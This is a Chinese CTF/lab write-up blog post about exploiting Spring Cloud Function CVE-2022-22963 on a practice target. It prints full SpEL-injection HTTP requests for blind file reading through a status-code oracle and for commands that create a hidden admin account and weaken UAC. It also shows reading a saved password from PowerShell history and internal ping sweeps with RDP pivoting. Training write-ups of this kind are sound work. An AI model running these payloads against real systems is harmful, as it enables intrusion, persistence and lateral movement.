@@ -1,0 +1,553 @@
+---
+translationKey: information-collection-and-reuse
+locale: zh-cn
+routeSlug: information-collection-and-reuse
+title: 信息的搜集与复用
+excerpt: 记录 Spring Cloud Function SpEL 注入、无回显状态码判断、内网横向移动与多层网络信息收集的完整题解。
+author: A1right
+seoTitle: 信息的搜集与复用：Spring Cloud Function 渗透测试题解
+seoDescription: 从 CVE-2022-22963 漏洞验证开始，记录状态码判断、Flag 提取、Windows 权限维持与内网信息收集过程。
+categoryKey: web-security
+category: Web 安全
+tags:
+  - Web 基础
+  - Spring Cloud
+  - SpEL 注入
+  - 内网渗透
+  - 横向移动
+visibility: public
+publishMode: now
+publishedAt: 2026-09-14
+updatedAt: 2026-09-14
+cover: /images/uploads/information-reuse-cover.jpg
+coverAlt: 雪景中的黑发动漫角色
+contentType: original
+allowRepost: allow-with-attribution
+pinned: false
+draft: false
+---
+
+# **信息的搜集与复用**
+
+## 题目：
+
+
+
+![image-20260906075946658](/images/uploads/information-reuse-01.png)
+
+先用nmap扫描存活端口
+
+![image-20260906080020338](/images/uploads/information-reuse-02.png)
+
+访问8080端口
+
+![image-20260906080034577](/images/uploads/information-reuse-03.png)
+
+> Powered by Spring Cloud Function 3.2.2
+
+## 攻击链总览
+
+```
+浏览器访问靶机 → BP 拦下正常请求 → 转 Repeater
+→ 加恶意头 spring.cloud.function.routing-expression 注入 SpEL
+→ sleep(5000) 响应变 5 秒 → RCE 实锤
+→ 命令无回显、目标不出网 → 改用"状态码判断法"问是非题
+→ 用 SpEL 的 File 类问出 flag 文件位置（桌面 flag 文件）
+→ Intruder 批量爆破每个位置的字符（状态码 500=猜对，200=猜错）
+→ 拼出 38 位 flag → equals() 整串验证闭环
+```
+
+**核心思想**：这个靶机执行了命令但不把结果显示出来。解决办法是把"猜对/猜错"变成响应的**状态码**（500=对，200=错），然后逐个字符去问。
+
+## 资料借鉴：
+
+> https://www.cnblogs.com/9eek/p/16113603.html
+
+## 信息收集
+
+### 1 指纹
+
+![image-20260906102140514](/images/uploads/information-reuse-04.png)
+
+**Spring Cloud Function 3.2.2 —— 正是 CVE-2022-22963 的受影响版本。**
+
+### 影响版本
+
+- 3.0.0.RELEASE &lt;= Spring Cloud Function &lt;= 3.1.6
+- Spring Cloud Function &lt;= 3.2.2
+- 官方不再支持的旧版本
+
+## 漏洞验证
+
+###  原理
+
+Spring Cloud Function 有个功能：请求头 **`spring.cloud.function.routing-expression`** 的值会被当成 SpEL 表达式**直接执行**，没有任何过滤。SpEL 能调用 Java 任意类 → 等于远程代码执行（RCE）。
+
+### 第一步：证明代码真的执行了
+
+在 Repeater 里把底片改成下面这样（路径改成 `/functionRouter`，加一个头）：
+
+```http
+POST /functionRouter HTTP/1.1
+Host: 10.100.116.102:8080
+spring.cloud.function.routing-expression: T(java.lang.Thread).sleep(5000)
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 11
+
+input=hello
+```
+
+**怎么看结果**：看 Repeater 界面显示的响应时间（Response 面板旁的 Time 显示）。
+
+实测：正常请求约 **0.08 秒**，这个包约 **5.07 秒** —— 服务器真的睡了 5 秒 → **SpEL 表达式被执行了，RCE 实锤**。
+
+![image-20260906102751132](/images/uploads/information-reuse-05.png)
+
+### 第二步：搭"状态码判断器"
+
+sleep 只能证明执行，但没法把数据"带出来"。靶机还有两个坏消息：
+
+1. 表达式的计算结果**不会出现在响应里**（网上经典 PoC 的回显在这里无效）
+2. 靶机**不能反向连接到我的电脑**（出网被防火墙挡了）
+
+解决思路：让服务器"猜对时故意报错"。SpEL 里 `1/0` 是除零，会抛异常 → Burp 里看到 **HTTP 500**；猜错时返回字符串 `'x'`，不报错 → **HTTP 200**。
+
+**判断器模板：**
+
+```http
+POST /functionRouter HTTP/1.1
+Host: 10.100.116.102:8080
+spring.cloud.function.routing-expression: (这里放判断条件) ? 1/0 : 'x'
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 11
+
+input=hello
+```
+
+- **响应 500 = 条件成立（猜对）**
+- **响应 200 = 条件不成立（猜错）**
+
+先验证判断器本身没毛病
+
+#### 正对照（`user.dir` 长度当然大于 0，必然为真）：
+
+```http
+POST /functionRouter HTTP/1.1
+Host: 10.100.204.2:8080
+spring.cloud.function.routing-expression: (T(java.lang.System).getProperty('user.dir').length() > 0) ? 1/0 : 'x'
+Content-Length: 11
+Cache-Control: max-age=0
+Upgrade-Insecure-Requests: 1
+Content-Type: application/x-www-form-urlencoded
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/152.0.0.0 Safari/537.36
+Origin: http://10.100.204.2:8080
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
+Referer: http://10.100.204.2:8080/
+Accept-Encoding: gzip, deflate, br
+Accept-Language: zh-CN,zh;q=0.9
+Connection: keep-alive
+
+input=hello
+```
+
+![image-20260906102928646](/images/uploads/information-reuse-06.png)
+
+实测响应：**HTTP 500** ✓
+
+#### 负对照（长度不可能小于 0，必然为假）：
+
+```http
+POST /functionRouter HTTP/1.1
+Host: 10.100.204.2:8080
+spring.cloud.function.routing-expression: (T(java.lang.System).getProperty('user.dir').length() < 0) ? 1/0 : 'x'
+Content-Length: 11
+Cache-Control: max-age=0
+Upgrade-Insecure-Requests: 1
+Content-Type: application/x-www-form-urlencoded
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/152.0.0.0 Safari/537.36
+Origin: http://10.100.204.2:8080
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
+Referer: http://10.100.204.2:8080/
+Accept-Encoding: gzip, deflate, br
+Accept-Language: zh-CN,zh;q=0.9
+Connection: keep-alive
+
+input=hello
+```
+
+![image-20260906103339573](/images/uploads/information-reuse-07.png)
+
+## 定位 flag 文件
+
+### 用 File 类逐个目录问
+
+把判断条件换成"某个目录的文件列表里有没有 flag 字样"。SpEL 读目录列表的固定写法：
+
+```
+T(java.util.Arrays).toString(new java.io.File('目录路径').list()).contains('flag')
+```
+
+> 路径注意：Windows 路径要写**正斜杠** `C:/Users/...`，别写反斜杠。
+
+示例包（问"Administrator 桌面上有没有名字带 flag 的文件"）：
+
+```http
+POST /functionRouter HTTP/1.1
+Host: 10.100.116.102:8080
+spring.cloud.function.routing-expression: (T(java.util.Arrays).toString(new java.io.File('C:/Users/Administrator/Desktop').list()).contains('flag')) ? 1/0 : 'x'
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 11
+
+input=hello
+```
+
+实测响应：**HTTP 500** —— 桌面上有！
+
+```http
+POST /functionRouter HTTP/1.1
+Host: 10.100.204.2:8080
+spring.cloud.function.routing-expression: (T(java.util.Arrays).toString(new java.io.File('C:/Users/Administrator/Desktop').list()).contains('flag')) ? 1/0 : 'x'
+Content-Length: 11
+Cache-Control: max-age=0
+Upgrade-Insecure-Requests: 1
+Content-Type: application/x-www-form-urlencoded
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/152.0.0.0 Safari/537.36
+Origin: http://10.100.204.2:8080
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
+Referer: http://10.100.204.2:8080/
+Accept-Encoding: gzip, deflate, br
+Accept-Language: zh-CN,zh;q=0.9
+Connection: keep-alive
+
+input=hello
+```
+
+![image-20260906103505474](/images/uploads/information-reuse-08.png)
+
+### 逐个位置试的结果汇总
+
+| 问的位置（条件里的路径）                         | 响应    | 结论     |
+| ------------------------------------------------ | ------- | -------- |
+| 当前目录 `.` 的文件列表含 flag                   | 200     | 没有     |
+| `C:/` 根目录文件列表含 flag                      | 200     | 没有     |
+| 环境变量里含 flag                                | 200     | 没有     |
+| `C:/Users/Administrator` 用户目录含 flag         | 200     | 没有     |
+| **`C:/Users/Administrator/Desktop` 桌面含 flag** | **500** | **有！** |
+
+再确认精确文件名（换条件为"这个文件存在吗"）：
+
+```http
+POST /functionRouter HTTP/1.1
+Host: 10.100.116.102:8080
+spring.cloud.function.routing-expression: (new java.io.File('C:/Users/Administrator/Desktop/flag').exists()) ? 1/0 : 'x'
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 11
+
+input=hello
+```
+
+实测：**500** = 存在。改后缀再问 `flag.txt` / `FLAG.txt` / `f1ag.txt` 全是 200。
+
+**结论：flag 在 `C:/Users/Administrator/Desktop/flag`（无扩展名）。**
+
+## 提取 flag 内容
+
+### 读文件内容的固定表达式
+
+SpEL 读整个文件的写法（后面记为 **$读文件**，写包时把它抄进去）：
+
+```
+new java.util.Scanner(new java.io.File('C:/Users/Administrator/Desktop/flag')).useDelimiter('\\A').next()
+```
+
+> **注意两个细节**：
+>
+> 1. `useDelimiter('\\A')` 里是**两个反斜杠**（SpEL 转义后才是"读到文件尾"的意思）。在 Burp 里直接照抄本 WP 的字面量即可，两个就是两个。
+> 2. 整个表达式很长，小心别抄漏括号。
+
+先问两个基础问题确认格式（都套判断器模板）：
+
+问"是不是 `flag{` 开头"：
+
+```http
+POST /functionRouter HTTP/1.1
+Host: 10.100.116.102:8080
+spring.cloud.function.routing-expression: (new java.util.Scanner(new java.io.File('C:/Users/Administrator/Desktop/flag')).useDelimiter('\\A').next().startsWith('flag{')) ? 1/0 : 'x'
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 11
+
+input=hello
+```
+
+实测：**500**（是 `flag{` 开头）
+
+问"长度是不是 38"：
+
+```http
+POST /functionRouter HTTP/1.1
+Host: 10.100.116.102:8080
+spring.cloud.function.routing-expression: (new java.util.Scanner(new java.io.File('C:/Users/Administrator/Desktop/flag')).useDelimiter('\\A').next().length() == 38) ? 1/0 : 'x'
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 11
+
+input=hello
+```
+
+实测：**500**（长度 38，即 `flag{` + 32 位 + `}` 标准格式）
+
+## Intruder 自动爆破得flag
+
+**步骤 1**：Repeater 里的包右键 → **Send to Intruder**，包体如下（先在 Repeater 里把表达式改成带 `0` 和 `102` 的样子）：
+
+```http
+POST /functionRouter HTTP/1.1
+Host: 10.100.204.2:8080
+spring.cloud.function.routing-expression:(new java.util.Scanner(new java.io.File('C:/Users/Administrator/Desktop/flag')).useDelimiter('\\A').next().codePointAt(0) == 102) ? 1/0 : 'x'
+Content-Length: 11
+Cache-Control: max-age=0
+Upgrade-Insecure-Requests: 1
+Content-Type: application/x-www-form-urlencoded
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/152.0.0.0 Safari/537.36
+Origin: http://10.100.204.2:8080
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
+Referer: http://10.100.204.2:8080/
+Accept-Encoding: gzip, deflate, br
+Accept-Language: zh-CN,zh;q=0.9
+Connection: keep-alive
+
+input=hello
+```
+
+**步骤 2**：Intruder → Positions 标签 → 点 **Clear §** 清掉自动标记 → 手动选中两个数字加标记：
+
+- 选中 `codePointAt(` 后面的 `0`，点 **Add §** → 变成 `codePointAt(§0§)`
+- 选中 `==` 后面的 `102`，点 **Add §** → 变成 `== §102§`
+
+**步骤 3**：Positions 页右上角 Attack type 选 **Cluster bomb**（两个位点各自配一组 payload，交叉组合）
+
+**步骤 4**：Payloads 标签：
+
+- **Payload set 1**（位置）：Payload type 选 **Numbers**，From `0`，To `37`，Step `1`
+- **Payload set 2**（字符码）：Payload type 选 **Numbers**，From `32`，To `126`，Step `1`
+
+![image-20260906105927862](/images/uploads/information-reuse-09.png)
+
+**步骤 5**：点 **Start attack**。共 38 × 95 = 3610 个请求，靶机响应很快（每个不到 0.1 秒)，几分钟跑完。
+
+**步骤 6**：结果表里点 **Status 列排序** —— 会有**恰好 38 行状态码 500**（每个位置一行，因为每个位置只有一个字符猜对）。每行的两个 payload 就是答案：
+
+- Payload 1 = 字符位置（0~37）
+- Payload 2 = 该位置字符的 ASCII 码
+
+![image-20260906110057144](/images/uploads/information-reuse-10.png)
+
+**步骤 7**：码点转字符。常用对照：`48~57`=数字0-9，`65~90`=大写A-Z，`97~122`=小写a-z，`123`=`{`，`125`=`}`。38 个码逐个转换太麻烦的话，把 38 个码点按位置排好粘进 CyberChef 的 **From Char Code**（逗号分隔，Data format 选 Decimal）一键转出。
+
+![image-20260906110302966](/images/uploads/information-reuse-11.png)
+
+得到flag
+
+> `flag{M2JvDHXty0zcECU6smOakQigPjhx3rpw}`
+
+## RCE 建管理员账户 + 关 UAC 远程过滤
+
+这台机器策略：**应用以 SYSTEM 运行**，exec 任何 net 命令都成功。
+
+建用户包：
+
+```http
+POST /functionRouter HTTP/1.1
+Host: 10.100.168.155:8080
+spring.cloud.function.routing-expression: T(java.lang.Runtime).getRuntime().exec(new String[]{"cmd","/c","net","user","svc_zc","Zc2026Pass8","/add"}).waitFor()
+Content-Length: 11
+Cache-Control: max-age=0
+Upgrade-Insecure-Requests: 1
+Content-Type: application/x-www-form-urlencoded
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/152.0.0.0 Safari/537.36
+Origin: http://10.100.168.155:8080
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
+Referer: http://10.100.168.155:8080/
+Accept-Encoding: gzip, deflate, br
+Accept-Language: zh-CN,zh;q=0.9
+Connection: keep-alive
+
+input=hello
+```
+
+实测响应：
+
+```http
+HTTP/1.1 200 
+spring.cloud.function.routing-expression: T(java.lang.Runtime).getRuntime().exec(new String[]{"cmd","/c","net","user","svc_zc","Zc2026Pass8","/add"}).waitFor()
+cache-control: max-age=0
+upgrade-insecure-requests: 1
+user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/152.0.0.0 Safari/537.36
+origin: http://10.100.168.155:8080
+referer: http://10.100.168.155:8080/
+accept-encoding: gzip, deflate, br
+accept-language: zh-CN,zh;q=0.9
+connection: keep-alive, keep-alive
+uri: /functionRouter
+Content-Type: text/html;charset=UTF-8
+Content-Length: 19
+Date: Sat, 05 Sep 2026 20:22:50 GMT
+Keep-Alive: timeout=60
+
+{"INPUT":["HELLO"]}
+```
+
+![image-20260906162315690](/images/uploads/information-reuse-12.png)
+
+加管理员组包：
+
+```http
+POST /functionRouter HTTP/1.1
+Host: 10.100.204.2:8080
+spring.cloud.function.routing-expression: T(java.lang.Runtime).getRuntime().exec(new String[]{"cmd","/c","net","localgroup","administrators","svc_zc","/add"}).waitFor()
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 11
+
+input=hello
+```
+
+实测响应：`HTTP 200` + `{"INPUT":["HELLO"]}`
+
+![image-20260906162344817](/images/uploads/information-reuse-13.png)
+
+> **注意**：exec 返回的都是 200 + 正常业务体，**不反映命令成败**。用状态码 oracle 逐项核实（示例）：
+
+```http
+POST /functionRouter HTTP/1.1
+Host: 10.100.204.2:8080
+spring.cloud.function.routing-expression: (T(java.lang.Runtime).getRuntime().exec(new String[]{"cmd","/c","net","user","svc_zc"}).waitFor() == 0) ? 1/0 : 'x'
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 11
+
+input=hello
+```
+
+实测：**HTTP 500** = 用户已建成（net user svc_zc 退出码 0）。同法核实 svc_zc 已在 administrators 组（500）、应用进程具有管理员权限（`net session` 退出码 0 → 500）。
+
+![image-20260906162401077](/images/uploads/information-reuse-14.png)
+
+关闭 UAC 远程令牌过滤（否则自建本地管理员网络登录会被降权拒绝）：
+
+```http
+POST /functionRouter HTTP/1.1
+Host: 10.100.204.2:8080
+spring.cloud.function.routing-expression: T(java.lang.Runtime).getRuntime().exec(new String[]{"cmd","/c","reg","add","HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\system","/v","LocalAccountTokenFilterPolicy","/t","REG_DWORD","/d","1","/f"}).waitFor()
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 11
+
+input=hello
+```
+
+![image-20260906162428922](/images/uploads/information-reuse-15.png)
+
+实测响应：`HTTP 200`。顺手启用内置 Administrator 并设密（备用）：
+
+```http
+POST /functionRouter HTTP/1.1
+Host: 10.100.204.2:8080
+spring.cloud.function.routing-expression: T(java.lang.Runtime).getRuntime().exec(new String[]{"cmd","/c","net","user","Administrator","Zc2026Pass8","/active:yes"}).waitFor()
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 11
+
+input=hello
+```
+
+![image-20260906162447130](/images/uploads/information-reuse-16.png)
+
+## 远程连接
+
+![image-20260906163519254](/images/uploads/information-reuse-17.png)
+
+![image-20260906163539451](/images/uploads/information-reuse-18.png)
+
+成功连接上了,桌面上就是我们之前得到的flag
+
+![image-20260906163756222](/images/uploads/information-reuse-19.png)
+
+## 入口机信息搜集
+
+![image-20260906164419298](/images/uploads/information-reuse-20.png)
+
+关键两块：
+
+| 网卡           | IP                              | 含义                                       |
+| :------------- | :------------------------------ | :----------------------------------------- |
+| interface0     | 10.100.168.155，网关 10.100.0.1 | 公网入口侧（就是平台分配的新地址）         |
+| **interface1** | **172.16.0.188**，无网关        | **内网网卡，第一层内网段 = 172.16.0.0/24** |
+
+```
+for /L %i in (1,1,254) do @start /b ping -n 1 -w 300 172.16.0.%i > nul
+(等10秒)
+arp -a
+```
+
+第一行是 254 个 ping 并发打满整个 /24（`start /b` 后台并行，几秒跑完），第二行看 ARP 表——**"动态(dynamic)”类型的新条目就是存活机器**（排除 172.16.0.255 广播和 224/239 组播那些静态的）。
+
+看结果时关注 `172.16.0.x` 段、类型为“**动态**”的条目，那些就是活机器。
+
+![image-20260906165011142](/images/uploads/information-reuse-21.png)
+
+## 获取密码：
+
+查看文件
+
+```
+C:\Users\Administrator\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
+```
+
+![image-20260906165819755](/images/uploads/information-reuse-22.png)
+
+成功得到密码  3rE7awMktj47
+
+## 连接主机二
+
+![image-20260906165947097](/images/uploads/information-reuse-23.png)
+
+![image-20260906170030311](/images/uploads/information-reuse-24.png)
+
+成功连接，在桌面获得第二个flag
+
+![image-20260906170104619](/images/uploads/information-reuse-25.png)
+
+## 然后连第三台
+
+**① 在 server-02 上确认第三层网段**
+
+开个 cmd：
+
+```
+ipconfig /all
+```
+
+看有没有第二块内网网卡（上一实例是 **172.17.0.22/24**）——有它就说明 172.17.0.0/24 网段存在。
+
+![image-20260906170223433](/images/uploads/information-reuse-26.png)
+
+**② 扫第三层找 server-03**
+
+同一个 cmd：
+
+```
+for /L %i in (1,1,254) do @start /b ping -n 1 -w 300 172.17.0.%i > nul
+arp -a
+```
+
+看 172.17 那个接口下的动态条目
+
+![image-20260906170958613](/images/uploads/information-reuse-27.png)
+
+**③ 从 server-02 直接 mstsc 过去**
+
+![image-20260906171123087](/images/uploads/information-reuse-28.png)
+
+![image-20260906171215870](/images/uploads/information-reuse-29.png)
+
+成功拿到最后一个flag
+
+第一个题完结
+
+
